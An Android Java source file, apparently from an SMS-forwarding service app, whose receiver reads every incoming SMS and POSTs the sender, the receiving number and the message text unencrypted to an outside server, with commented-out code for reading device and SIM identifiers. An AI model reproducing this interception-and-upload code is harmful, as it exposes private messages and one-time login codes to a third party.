package com.sms.smsservice;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.util.List;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onReceive(Context context, Intent intent) {
        String deviceid = "";
        String simserial = "";
        int simstate;
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        // throw new UnsupportedOperationException("Not yet implemented");
        Log.d("sms-service", "onReceive: SmsReceiver");
        Bundle bundle = intent.getExtras();
        int slotindex = bundle.getInt("slot");
        int subid = bundle.getInt("subscription");
        //for (String key : bundle.keySet()){
        //    Log.d("sms-service", "onReceive: key => "+ key + " => " + bundle.get(key));
        //}
        SmsMessage[] msgs;
        String strMessage = "";
        String format = bundle.getString("format");
        Object[] pdus = (Object[]) bundle.get("pdus");

        SubscriptionManager sm = SubscriptionManager.from(context);
        Log.d("sms-service", "onReceive: " + sm.toString());
        List<SubscriptionInfo> sis = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            sis = sm.getCompleteActiveSubscriptionInfoList();
            Log.d("sms-service", "onReceive: " + sis.toString());
            for ( SubscriptionInfo si : sis){
                Log.d("sms-service", String.format("onReceive: %s", si));
            }
        }
        //SubscriptionInfo si = sis.get(slotindex);
        //deviceid = si.getIccId();
        //simserial = si.getNumber();

        /**
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        deviceid = tm.getDeviceId(slotindex);
        simstate = tm.getSimState(slotindex);
        simserial = tm.getSimSerialNumber();
        String imei = tm.getImei(slotindex);
         */
        //Log.d("sms-service", "onReceive: " + String.format("DeviceId: %s || SimSerial: %s", deviceid, simserial));

        msgs = new SmsMessage[pdus.length];
        for(int i=0; i < msgs.length; i++){
            msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            //strMessage += "Sms From:" + msgs[i].getDisplayOriginatingAddress();
            String fr = msgs[i].getDisplayOriginatingAddress();
            String to = this.getPhoneNumberOfSlotIndex(context, slotindex);
            String msg = msgs[i].getDisplayMessageBody();
            strMessage += "Sms From: " + fr;
            strMessage += String.format(" To: Sim %s", to);
            strMessage += " ======== " + msg;
            Log.d("sms-sreveice", "onReceive: " + strMessage);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    this.reportSmsMessage(fr, to, msg);
                }

                private void reportSmsMessage(String fr, String to, String msg){
                    try {
                        URL url = new URL("http://imessage.seechat.cc/sms/index/smsReceive.html");
                        HttpURLConnection http = (HttpURLConnection)url.openConnection();
                        http.setRequestMethod("POST");
                        http.setConnectTimeout(5000);
                        http.setRequestProperty("charset", "utf-8");

                        String data = String.format("s=%s&d=%s&msg=%s", fr, to, msg);
                        http.setDoOutput(true);
                        OutputStream outputStream = http.getOutputStream();
                        outputStream.write(data.getBytes());

                        int nrc = http.getResponseCode();
                        Log.d("sms-service", "reportSmsMessage: " + nrc);
                    } catch (MalformedURLException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                }
            }).start();
        }
        Toast.makeText(context, strMessage, Toast.LENGTH_LONG).show();

    }

    private String getPhoneNumberOfSlotIndex(Context context, int slotindex){
        String ret = "";
        // Get phone numbers
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            SubscriptionManager sm = SubscriptionManager.from(context);
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                Log.e("sms-service-permission", "onStart: SubscriptionInfo no permission");
                return "";
            }
            List<SubscriptionInfo> sis = sm.getActiveSubscriptionInfoList();
            for( SubscriptionInfo si : sis){
                if ( si.getSimSlotIndex() == slotindex){
                    ret = si.getNumber();
                }
            }
            return ret;
        }
        return "";
    }


}